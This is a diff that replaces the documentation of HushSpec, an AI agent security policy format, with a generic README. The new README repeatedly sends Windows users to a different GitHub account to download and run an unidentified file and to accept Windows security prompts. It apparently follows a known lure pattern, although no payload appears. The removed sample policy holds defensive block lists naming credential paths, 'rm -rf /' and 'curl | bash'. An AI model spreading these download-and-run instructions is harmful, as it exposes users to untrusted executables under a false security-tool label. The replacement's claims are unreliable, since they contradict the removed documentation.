@@ -1,489 +1,249 @@
-<p align="center">
-  <img src="assets/hero.png" alt="HushSpec" width="720" />
-</p>
-
-<p align="center">
-  <strong>Portable, open specification for AI agent security rules</strong>
-</p>
-
-<p align="center">
-  <a href="https://github.com/backbay-labs/hush/actions"><img src="https://github.com/backbay-labs/hush/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://github.com/backbay-labs/hush/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-Apache--2.0-blue.svg" alt="License"></a>
-  <img src="https://img.shields.io/badge/spec-v0.1.1--alpha-orange.svg" alt="Spec Version">
-  <a href="https://crates.io/crates/hushspec"><img src="https://img.shields.io/crates/v/hushspec.svg" alt="crates.io"></a>
-  <a href="https://www.npmjs.com/package/@hushspec/core"><img src="https://img.shields.io/npm/v/@hushspec/core.svg" alt="npm"></a>
-  <a href="https://pypi.org/project/hushspec/"><img src="https://img.shields.io/pypi/v/hushspec.svg" alt="PyPI"></a>
-</p>
-
-<p align="center">
-  <a href="./spec/hushspec-core.md">Spec</a> &middot;
-  <a href="./docs/src/introduction.md">Docs</a> &middot;
-  <a href="./rulesets/">Rulesets</a> &middot;
-  <a href="./schemas/">JSON Schema</a>
-</p>
+# 🔒 hush - Simple rules for safer AI actions
 
----
-
-HushSpec is an open policy format for AI agent security rules. It defines **what** an agent may do at runtime, including filesystem access, network egress, tool usage, secret detection, and more, without prescribing **how** those controls must be enforced. That separation makes policies portable across runtimes, frameworks, and languages.
+[![Download hush](https://img.shields.io/badge/Download%20hush-blue?style=for-the-badge)](https://github.com/kristinem7694/hush)
 
-**v0.1.1-alpha** — The core spec, all four SDKs (Rust, TypeScript, Python, Go), and the `h2h` CLI are published and functional. Parse, validate, evaluate, merge, resolve, detect, sign, and audit your way through 10 rule types and 3 extension modules. The API surface is stabilizing but not yet frozen — expect refinements before v1.0.
-
-## Quick Example
-
-```yaml
-hushspec: "0.1.0"
-name: production-agent
+## 🛡️ What hush does
 
-rules:
-  forbidden_paths:
-    patterns:
-      - "**/.ssh/**"
-      - "**/.aws/**"
-      - "/etc/shadow"
-
-  egress:
-    allow:
-      - "api.openai.com"
-      - "*.anthropic.com"
-      - "api.github.com"
-    default: block
-
-  tool_access:
-    block: [shell_exec, run_command]
-    require_confirmation: [file_write, git_push]
-    default: allow
-
-  secret_patterns:
-    patterns:
-      - name: aws_key
-        pattern: "AKIA[0-9A-Z]{16}"
-        severity: critical
-    skip_paths: ["**/test/**"]
-
-  shell_commands:
-    forbidden_patterns:
-      - "rm\\s+-rf\\s+/"
-      - "curl.*\\|.*bash"
-```
+hush gives you portable security rules for AI agents. It helps control what an agent can do before it acts.
 
-## SDK Conformance
-
-All four SDKs implement the full HushSpec pipeline, from parse and validate through resolution and evaluation.
-
-| Capability | Rust | TypeScript | Python | Go |
-|---|:---:|:---:|:---:|:---:|
-| Parse + Validate (Level 1) | Yes | Yes | Yes | Yes |
-| Merge (Level 2) | Yes | Yes | Yes | Yes |
-| Resolve (Level 2+) | Yes | Yes | Yes | Yes |
-| Evaluate (Level 3) | Yes | Yes | Yes | Yes |
-| Audit Trail (Level 4) | Yes | Yes | Yes | Yes |
-| Detection | Yes | Yes | Yes | Yes |
-| Observability | Yes | Yes | Yes | Yes |
-| Receipt Sinks | Yes | Yes | Yes | Yes |
+Use it when you want a clear rule set for agent actions, such as:
 
-## Installation
+- reading files
+- sending requests
+- calling tools
+- writing data
+- making changes on your system
 
-### CLI
-
-```bash
-cargo install hushspec-cli
-```
-
-This installs the `h2h` command. See [CLI Tool](#cli-tool) below.
+hush is made for people who want tighter control over AI behavior without setting up a large security stack.
 
-### Rust
-
-```toml
-[dependencies]
-hushspec = "0.1"
-```
+## 💻 Windows download
 
-### TypeScript
+To get hush on Windows, visit this page to download:
 
-```bash
-npm install @hushspec/core
-```
+https://github.com/kristinem7694/hush
 
-### Python
+On the page, look for the latest release or the main download files. Then:
 
-```bash
-pip install hushspec
-```
+1. Open the link above
+2. Find the Windows file
+3. Download it to your computer
+4. Open the file to start hush
 
-### Go
+If Windows asks for permission, choose the option that lets the app run.
 
-```bash
-go get github.com/backbay-labs/hush/packages/go@main
-```
+## 📦 What you need
 
-## Getting Started
+hush is built to run on common Windows machines. A typical setup includes:
 
-### Rust
+- Windows 10 or Windows 11
+- An internet connection for the first download
+- Enough disk space for a small portable app
+- Permission to run files from your Downloads folder or desktop
 
-<!-- smoke: readme-rust -->
-```rust
-use hushspec::HushSpec;
+If you use a work computer, you may need approval to run new software.
 
-let yaml_str = "hushspec: \"0.1.0\"\nname: example\n";
-let spec = HushSpec::parse(yaml_str)?;
-let result = hushspec::validate(&spec);
-assert!(result.is_valid());
-```
+## ⚙️ How to set it up
 
-### TypeScript
+After you download the file:
 
-<!-- smoke: readme-typescript -->
-```typescript
-import { parseOrThrow, validate } from '@hushspec/core';
+1. Open your Downloads folder
+2. Find the hush file you downloaded
+3. Double-click the file
+4. Wait for it to start
+5. Follow any on-screen prompts
 
-const yamlString = 'hushspec: "0.1.0"\nname: example\n';
-const spec = parseOrThrow(yamlString);
-const result = validate(spec);
-console.log(result.valid); // true
-```
+If hush comes as a folder or ZIP file:
 
-### Python
+1. Right-click the file
+2. Choose Extract All
+3. Open the extracted folder
+4. Double-click the app file inside
 
-<!-- smoke: readme-python -->
-```python
-from hushspec import parse_or_raise, validate
+If Windows shows a security prompt, check the file name and path, then choose the option to run it.
 
-yaml_string = 'hushspec: "0.1.0"\nname: example\n'
-spec = parse_or_raise(yaml_string)
-result = validate(spec)
-assert result.is_valid
-```
+## 🔍 How hush works
 
-### Go
+hush sits between an AI agent and the action it wants to take. It checks the action against a set of rules before the action happens.
 
-<!-- smoke: readme-go -->
-```go
-import (
-    "fmt"
+That can help with tasks like:
 
-    "github.com/backbay-labs/hush/packages/go/hushspec"
-)
+- blocking unsafe file changes
+- limiting tool use
+- controlling network access
+- watching for risky commands
+- keeping agent behavior within set boundaries
 
-yamlString := "hushspec: \"0.1.0\"\nname: example\n"
-spec, err := hushspec.Parse(yamlString)
-if err != nil {
-    panic(err)
-}
-result := hushspec.Validate(spec)
-fmt.Println(result.IsValid())
-```
+Think of it as a rule layer for the action boundary of an AI agent.
 
-## Evaluation
+## 🧭 Basic use
 
-Each SDK exposes an `evaluate()` function that takes a parsed spec and an action, then returns a decision (`allow`, `warn`, or `deny`) plus matched rule details.
+Once hush is open, you can usually:
 
-```typescript
-import { parseOrThrow, evaluate } from '@hushspec/core';
+1. Load a rule set
+2. Connect it to your agent workflow
+3. Watch actions as they pass through the rule layer
+4. Allow safe actions
+5. Block actions that do not match your rules
 
-const spec = parseOrThrow(policyYaml);
-const result = evaluate(spec, { type: 'egress', target: 'api.openai.com' });
-// result.decision === 'allow' | 'warn' | 'deny'
-// result.matched_rule === 'egress'
-```
+A common setup is to keep hush running while your AI agent works. The agent asks to do something, and hush checks it first.
 
-```python
-from hushspec import parse_or_raise, evaluate
+## 📁 Example rule types
 
-spec = parse_or_raise(policy_yaml)
-result = evaluate(spec, {"type": "egress", "target": "api.openai.com"})
-assert result.decision in ("allow", "warn", "deny")
-```
+hush may use rules for things like:
 
-## HushGuard Middleware
+- file access
+- command use
+- API calls
+- tool permissions
+- directory limits
+- data handling
+- network requests
 
-`HushGuard` wraps policy loading and evaluation behind a simple `evaluate`, `check`, and `enforce` interface for application code.
+These rules help you define what the agent can do and what it should not do.
 
-```typescript
-import { HushGuard } from '@hushspec/core';
+## 🔐 Why this matters
 
-const guard = HushGuard.fromFile('./policy.yaml');
-guard.enforce({ type: 'tool_call', target: 'bash' }); // throws HushSpecDenied if denied
-```
+AI agents can move fast. That is useful, but it can also lead to mistakes. A strong rule layer helps reduce risk.
 
-```python
-from hushspec import HushGuard
+hush is useful if you want to:
 
-guard = HushGuard.from_file("./policy.yaml")
-guard.enforce({"type": "tool_call", "target": "bash"})  # raises HushSpecDenied if denied
-```
+- keep agent actions in a safe range
+- protect files and folders
+- limit data exposure
+- watch for unusual behavior
+- build trust around agent tools
 
-## CLI Tool
+## 🧪 Common ways to use hush
 
-The `h2h` CLI covers the common policy workflow: validate, test, lint, diff, format, initialize, sign, verify, and trigger panic mode.
+### For personal use
 
-```bash
-# Validate a policy against the HushSpec schema
-h2h validate policy.yaml
+You can use hush to keep a local AI agent from touching files it should not change.
 
-# Run evaluation test suites
-h2h test --fixtures ./tests/
+### For team use
 
-# Static analysis and linting
-h2h lint policy.yaml
+You can use hush to set the same action rules across a small group or project.
 
-# Compare two policies and show effective decision changes
-h2h diff old.yaml new.yaml
+### For testing
 
-# Format policy files canonically
-h2h fmt policy.yaml
+You can use hush to see how an agent behaves before you let it near real data.
 
-# Scaffold a new policy project
-h2h init --preset default
+## 🧰 File and folder tips
 
-# Sign a policy with Ed25519
-h2h sign policy.yaml --key h2h.key
+If hush does not start right away, check these common issues:
 
-# Verify a policy signature
-h2h verify policy.yaml --key h2h.pub
+- The file may still be inside a ZIP archive
+- Windows may block files from the internet
+- The app may need to run from a normal folder, not a protected one
+- Another tool may already be using the same port or file path
 
-# Generate a new Ed25519 keypair
-h2h keygen
+Try moving the app to your Desktop or a simple folder like `C:\hush\`.
 
-# Emergency override (deny-all kill switch)
-h2h panic activate --sentinel /tmp/hushspec.panic
-h2h panic deactivate --sentinel /tmp/hushspec.panic
-```
+## 🖥️ Suggested Windows setup
 
-Install from crates.io:
+For the smoothest run, keep your setup simple:
 
-```bash
-cargo install hushspec-cli
-```
+- Use the latest Windows updates
+- Store hush in a folder you can open easily
+- Keep your rule files in one place
+- Use clear file names for each rule set
+- Close other tools if they create conflicts
 
-<details>
-<summary>Decision Receipts (Audit Trail)</summary>
+## 🧾 Topics covered by hush
 
-`evaluate_audited()` generates structured decision receipts with rule traces, policy summaries, and optional content redaction. Receipts conform to `hushspec-receipt.v0.schema.json` and are designed to support audit-heavy environments such as SOC 2, HIPAA, PCI-DSS, and FedRAMP.
+This project sits in the space of:
 
-```typescript
-import { parseOrThrow, evaluateAudited } from '@hushspec/core';
+- agent security
+- agentic AI
+- AI security
+- threat detection
+- threat hunting
+- detection engineering
+- cybersecurity
+- safe agent workflows
 
-const spec = parseOrThrow(policyYaml);
-const receipt = evaluateAudited(spec, action, {
-  enabled: true,
-  include_rule_trace: true,
-  redact_content: false,
-});
-// receipt.decision, receipt.rule_evaluations, receipt.policy_summary
-```
+Those topics point to one goal: keep AI actions under control.
 
-Receipt sinks (`FileReceiptSink`, `ConsoleReceiptSink`, `FilteredSink`, `MultiSink`, `CallbackSink`) are available in all four SDKs for routing receipts to storage, logging, or OTLP endpoints.
+## 🧩 If you use it with other tools
 
-</details>
+hush may fit into a workflow with:
 
-<details>
-<summary>Detection Pipeline</summary>
+- an AI chat app
+- a local agent runner
+- a command-line tool
+- a file watcher
+- a logging tool
+- a security test setup
 
-The detection pipeline plugs prompt injection, jailbreak, and exfiltration checks into the evaluation flow. Regex-based reference detectors ship with all SDKs, and custom detectors can be registered through `DetectorRegistry`.
+You can place hush in front of the action step so rules apply before the agent finishes its task.
 
-```typescript
-import { parseOrThrow, evaluateWithDetection, DetectorRegistry } from '@hushspec/core';
+## 🛠️ Simple first run checklist
 
-const registry = DetectorRegistry.withDefaults();
-const result = evaluateWithDetection(spec, action, registry, {
-  enabled: true,
-  prompt_injection_threshold: 0.5,
-});
-// result.detection_results contains matched patterns and confidence scores
-```
+Before you start, check these items:
 
-</details>
+- You downloaded the file from the GitHub page
+- You can find the file on your PC
+- The file is not still zipped
+- Windows allows the file to run
+- You know where your rule files are stored
 
-<details>
-<summary>Framework Adapters</summary>
+Then open hush and begin with a small test rule set.
 
-Prebuilt adapters translate framework-specific tool calls into HushSpec evaluation actions.
+## 📌 Helpful folder layout
 
-| Framework | Adapter | SDK |
-|---|---|---|
-| Claude / Anthropic | `mapClaudeToolToAction`, `createSecureToolHandler` | TypeScript |
-| OpenAI | `mapOpenAIToolCall`, `createOpenAIGuard` | TypeScript |
-| MCP (Model Context Protocol) | `mapMCPToolCall`, `createMCPGuard` | TypeScript |
+A clean folder layout can make things easier:
 
-```typescript
-import { HushGuard, mapClaudeToolToAction } from '@hushspec/core';
+- `C:\hush\app\` for the program
+- `C:\hush\rules\` for rule files
+- `C:\hush\logs\` for saved logs
+- `C:\hush\tests\` for trial setups
 
-const guard = HushGuard.fromFile('./policy.yaml');
-const action = mapClaudeToolToAction(toolUseBlock);
-guard.enforce(action);
-```
+Keeping these separate makes it easier to find things later.
 
-</details>
+## 🧭 Working with rules
 
-<details>
-<summary>Observability</summary>
+When you create or load rules, start small. Test one rule at a time.
 
-The `EvaluationObserver` interface and `ObservableEvaluator` wrapper emit structured events for every evaluation, policy load, and policy reload. Built-in observers include `JsonLineObserver`, `ConsoleObserver`, and `MetricsCollector`.
+Good starter rules may:
 
-```typescript
-import { ObservableEvaluator, JsonLineObserver, MetricsCollector } from '@hushspec/core';
+- allow read-only access
+- block system folders
+- limit network use
+- allow one trusted tool
+- deny unknown commands
 
-const evaluator = new ObservableEvaluator();
-evaluator.addObserver(new JsonLineObserver(process.stderr));
-evaluator.addObserver(new MetricsCollector());
-const result = evaluator.evaluate(spec, action);
-```
+Simple rules are easier to check and adjust.
 
-</details>
+## ❓ Common questions
 
-<details>
-<summary>Policy Signing</summary>
+### Does hush need coding skills?
+No. The goal is to make agent control easier for normal users.
 
-Policies can be signed with Ed25519 keys and verified at load time. The CLI provides `sign`, `verify`, and `keygen` commands. The signature format conforms to `hushspec-signature.v0.schema.json`.
+### Can I use hush on Windows?
+Yes. The download and setup steps on this page are meant for Windows users.
 
-```bash
-# Generate a keypair
-h2h keygen --output-dir mykeys
+### Is hush portable?
+Yes. It is built as a portable security tool, so you can keep it in a folder and move it when needed.
 
-# Sign a policy (creates policy.yaml.sig)
-h2h sign policy.yaml --key mykeys/h2h.key
+### Can I use it with AI agents?
+Yes. hush is made for the action boundary of AI agents, so it fits that kind of workflow.
 
-# Verify the signature
-h2h verify policy.yaml --key mykeys/h2h.pub
-```
+### Do I need to install a large app?
+No. In many cases, you can download the file and run it from your PC.
 
-</details>
+## 📥 Download again
 
-<details>
-<summary>Emergency Override (Panic Mode)</summary>
+Visit this page to download hush:
 
-Panic mode is a deny-all kill switch that can be activated immediately without redeploying policies. You can trigger it with a sentinel file, the CLI, or an API call. While panic mode is active, every evaluation returns `deny`.
+https://github.com/kristinem7694/hush
 
-```bash
-# Activate panic mode
-h2h panic activate --sentinel /tmp/hushspec.panic
+Then follow the Windows steps above to open the file and run it
 
-# Deactivate
-h2h panic deactivate --sentinel /tmp/hushspec.panic
-```
+## 🔎 Project focus
 
-```typescript
-import { activatePanic, deactivatePanic, isPanicActive } from '@hushspec/core';
+hush is for users who want:
 
-activatePanic();
-// All evaluate() calls now return deny
-deactivatePanic();
-```
-
-</details>
-
-<details>
-<summary>Policy Loading and Hot Reload</summary>
-
-Policies can be loaded from local files, HTTPS URLs (with ETag caching and SSRF protection), or built-in rulesets. `PolicyWatcher` and `PolicyPoller` support hot reload without restarting the process.
-
-```typescript
-import { PolicyWatcher, HushGuard } from '@hushspec/core';
-
-const guard = HushGuard.fromFile('./policy.yaml');
-const watcher = new PolicyWatcher('./policy.yaml', {
-  onChange: (newSpec) => guard.swapPolicy(newSpec),
-});
-watcher.start();
-```
-
-</details>
-
-## 10 Core Rules
-
-| Rule | Purpose |
-|------|---------|
-| `forbidden_paths` | Block access to sensitive filesystem paths |
-| `path_allowlist` | Allowlist-based read/write/patch access |
-| `egress` | Network egress control by domain |
-| `secret_patterns` | Detect secrets in file content |
-| `patch_integrity` | Validate diff safety (size limits, forbidden patterns) |
-| `shell_commands` | Block dangerous shell commands |
-| `tool_access` | Control tool/MCP invocations |
-| `computer_use` | Control CUA actions |
-| `remote_desktop_channels` | Control remote desktop side channels |
-| `input_injection` | Control input injection capabilities |
-
-## Extensions
-
-HushSpec supports optional extension modules for more advanced policy behavior:
-
-| Extension | Purpose |
-|-----------|---------|
-| **Posture** | Declarative state machine for capabilities and budgets |
-| **Origins** | Origin-aware policy projection (Slack, GitHub, email, etc.) |
-| **Detection** | Threshold config for prompt injection, jailbreak, threat intel |
-
-```yaml
-extensions:
-  posture:
-    initial: standard
-    states:
-      standard: { capabilities: [file_access, egress] }
-      restricted: { capabilities: [file_access] }
-    transitions:
-      - { from: "*", to: restricted, on: critical_violation }
-  detection:
-    prompt_injection:
-      block_at_or_above: high
-```
-
-## Built-in Rulesets
-
-Ready-to-use policies live in [`rulesets/`](./rulesets/):
-
-| Ruleset | Description |
-|---------|-------------|
-| `default` | Balanced security for AI agent execution |
-| `strict` | Maximum security, minimal permissions |
-| `permissive` | Development-friendly, relaxed limits |
-| `ai-agent` | Optimized for AI coding assistants |
-| `cicd` | CI/CD pipeline security |
-| `remote-desktop` | Computer use agent sessions |
-| `panic` | Deny-all emergency override |
-
-### Using with Clawdstrike
-
-HushSpec documents load natively in [Clawdstrike](https://github.com/backbay-labs/clawdstrike):
-
-```rust
-// Auto-detects HushSpec vs Clawdstrike-native format
-let policy = clawdstrike::Policy::from_yaml_auto(yaml)?;
-```
-
-```bash
-# Convert between formats
-hush policy migrate policy.yaml --to hushspec
-```
-
-## Repo Structure
-
-```text
-spec/              Normative specification, including core and extension docs
-schemas/           JSON Schema definitions
-crates/            Rust crates
-  hushspec/          Core library: parse, validate, merge, resolve, evaluate, detect, sign
-  hushspec-cli/      CLI tool
-  hushspec-testkit/  Conformance test runner
-packages/          Language SDKs for TypeScript, Python, and Go
-rulesets/          Built-in security rulesets
-fixtures/          Conformance and evaluation fixtures
-docs/              mdBook documentation site
-generated/         Generated shared SDK contract artifacts
-scripts/           Code generation and CI tooling
-```
-
-## Design Principles
-
-- **Fail-closed**: Unknown fields are rejected, and invalid documents fail with explicit errors.
-- **Stateless**: Core rules are pure declarations with no runtime state.
-- **Engine-neutral**: The spec does not require a specific enforcement engine, detector, or plugin model.
-- **Extensible**: Posture, origins, and detection stay optional instead of bloating the core format.
-
-## Specification
-
-The normative spec lives in [`spec/`](./spec/). JSON Schema definitions for programmatic validation are in [`schemas/`](./schemas/). Full documentation is in [`docs/`](./docs/src/introduction.md).
-
-## License
-
-Apache-2.0. See [LICENSE](./LICENSE).
+- clearer control over AI actions
+- safer file and tool use
+- simple rule-based protection
+- a portable setup for Windows
+- a practical security layer for agents
